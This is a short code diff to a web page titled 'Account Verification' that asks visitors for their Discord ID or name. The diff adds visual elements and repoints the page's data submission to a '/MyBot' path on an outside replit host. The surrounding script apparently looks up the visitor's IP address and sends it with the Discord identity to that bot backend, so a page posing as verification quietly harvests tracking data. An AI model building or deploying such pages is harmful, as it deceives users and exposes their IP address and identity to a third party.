@@ -8,6 +8,9 @@
   <link rel="icon" type="image/png" sizes="32x32" href="../Images/logo.png">
 </head>
 <body>
+    <canvas id="particles"></canvas>
+    <div class="background"></div>
+
   <h1>Account Verification</h1>
   <form id="verify-form">
     <label for="discord-id">Enter your Discord ID or Name:</label>
@@ -16,7 +19,6 @@
   </form>
 
   <p id="status"></p>
-
   <script>
     document.getElementById('verify-form').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -33,7 +35,7 @@
       const ipData = await ipResponse.json();
 
       // Enviar datos al backend
-      const response = await fetch('https://qnelsimar1452.replit.app/', {
+      const response = await fetch('https://qnelsimar1452.replit.app/MyBot', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
